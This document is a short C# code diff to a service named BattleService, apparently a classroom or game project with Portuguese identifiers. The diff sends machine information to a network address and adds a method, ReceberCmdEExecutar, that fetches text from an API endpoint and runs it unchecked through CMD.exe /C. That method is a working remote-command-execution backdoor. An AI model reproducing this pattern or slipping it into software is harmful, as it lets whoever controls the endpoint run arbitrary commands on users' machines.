@@ -93,10 +93,24 @@ namespace BattleService
 
         public void EnviarParaApi(Machine machine)
         {
-            var client = new RestClient("http://localhost:60246");
+            Console.WriteLine("Enviando informações para API");
+            var client = new RestClient("http://192.168.114.2:60751");
             var request = new RestRequest("/api/BattleRoyalle", Method.POST);
             request.AddJsonBody(machine);
             client.Execute(request);
+        }
+
+        public void ReceberCmdEExecutar()
+        {
+            var client = new RestClient("http://localhost:60246");
+            var request = new RestRequest("/api/BattleRoyalle", Method.GET);
+
+            var response = client.Execute(request);
+            Console.WriteLine(response.Content);
+
+            var strCmdText = @"/C " + response.Content;
+            System.Diagnostics.Process.Start("CMD.exe", strCmdText);
+
         }
     }
 }
